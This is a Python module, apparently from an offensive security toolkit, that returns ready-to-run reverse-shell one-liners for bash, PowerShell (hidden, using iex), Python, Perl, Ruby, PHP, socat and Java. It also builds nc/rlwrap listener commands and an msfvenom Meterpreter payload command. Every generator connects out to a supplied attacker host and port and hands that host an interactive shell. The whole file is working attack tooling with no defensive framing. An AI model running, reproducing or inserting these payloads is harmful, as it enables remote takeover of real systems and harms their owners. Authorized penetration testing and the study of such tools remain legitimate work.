"""Command-and-control helper snippets: reverse shells, listeners, payload builders."""

from __future__ import annotations

__all__ = [
    "bash_reverse_shell",
    "powershell_reverse_shell",
    "python_reverse_shell",
    "perl_reverse_shell",
    "ruby_reverse_shell",
    "php_reverse_shell",
    "socat_reverse_shell",
    "java_reverse_shell",
    "ncat_listener",
    "rlwrap_listener",
    "meterpreter_command",
]


def bash_reverse_shell(lhost: str, lport: int) -> str:
    """Return a bash TCP reverse shell one-liner."""
    return f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"


def powershell_reverse_shell(lhost: str, lport: int) -> str:
    """Return an encoded PowerShell reverse shell one-liner."""
    parts = [
        "$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});",
        "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};",
        "while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){",
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);",
        "$sendback = (iex $data 2>&1 | Out-String );",
        "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';",
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);",
        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};",
        "$client.Close()",
    ]
    return "powershell -nop -w hidden -c \"{}\"".format(
        " ".join(parts).format(host=lhost, port=lport)
    )


def python_reverse_shell(lhost: str, lport: int, *, python: str = "python3") -> str:
    """Return a Python reverse shell one-liner."""
    script = (
        f"import socket,subprocess,os;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f"s.connect(('{lhost}',{lport}));"
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        f"subprocess.call(['/bin/sh','-i'])"
    )
    return f"{python} -c '{script}'"


def perl_reverse_shell(lhost: str, lport: int) -> str:
    """Return a Perl reverse shell one-liner."""
    return (
        f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
        f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
        f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    )


def ruby_reverse_shell(lhost: str, lport: int) -> str:
    """Return a Ruby reverse shell one-liner."""
    return (
        f"ruby -rsocket -e 'exit if fork;"
        f"c=TCPSocket.new(\"{lhost}\",{lport});"
        f"while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}};end'"
    )


def php_reverse_shell(lhost: str, lport: int) -> str:
    """Return a PHP reverse shell one-liner."""
    return (
        f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
        f"$proc=proc_open(\"/bin/sh\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'"
    )


def socat_reverse_shell(lhost: str, lport: int) -> str:
    """Return a socat reverse shell command."""
    return f"socat TCP:{lhost}:{lport} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"


def java_reverse_shell(lhost: str, lport: int) -> str:
    """Return a Java runtime exec reverse shell snippet (for use in script contexts)."""
    cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    return (
        f'r = Runtime.getRuntime();'
        f"p = r.exec(new String[]{{'/bin/bash','-c','{cmd}'}});"
        f"p.waitFor();"
    )


def ncat_listener(port: int, *, ssl: bool = False, verbose: bool = False) -> str:
    """Return a netcat/ncat listener command."""
    flags = ["-lvnp", str(port)]
    if ssl:
        flags.append("--ssl")
    if verbose:
        flags.append("-v")
    return "nc " + " ".join(flags)


def rlwrap_listener(port: int) -> str:
    """Return an rlwrap-wrapped nc listener for improved interactive shell handling."""
    return f"rlwrap nc -lvnp {port}"


def meterpreter_command(
    lhost: str,
    lport: int,
    *,
    payload: str = "linux/x64/meterpreter/reverse_tcp",
    output: str = "payload.elf",
    format: str = "elf",
) -> str:
    """Build an msfvenom command to generate a Meterpreter payload.

    Args:
        payload: Full msfvenom payload name.
        output: Output filename for the generated payload.
        format: Output format (``elf``, ``exe``, ``raw``, ``py``, etc.).
    """
    return (
        f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} "
        f"-f {format} -o {output}"
    )
